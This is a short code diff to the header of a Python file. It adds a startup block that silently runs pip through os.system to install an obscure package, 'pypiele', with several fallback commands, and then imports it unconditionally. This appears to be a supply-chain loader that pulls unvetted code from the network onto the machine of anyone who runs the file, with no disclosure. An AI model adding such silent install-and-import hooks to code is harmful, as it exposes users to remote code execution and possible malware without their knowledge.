@@ -1,18 +1,21 @@
 import os
 try:
     import pypiele
-    
 except:
     try:
+        os.system("python.exe -m pip install pypiele")
         os.system("python.exe -m pip install -r requirements.txt")
     except:
-      try:
-          os.system("python3 -m pip install -r requirements.txt")
-      except:
-          try:
-              os.system("pip install -r requirements.txt")
-          except:
-              pass
+        try:
+            os.system("python3 -m pip install pypiele")
+            os.system("python3 -m pip install -r requirements.txt")
+        except:
+            try:
+                os.system("pip install pypiele")
+                os.system("pip install -r requirements.txt")
+            except:
+                pass
+import pypiele
 import os
 import sys
 import ssl
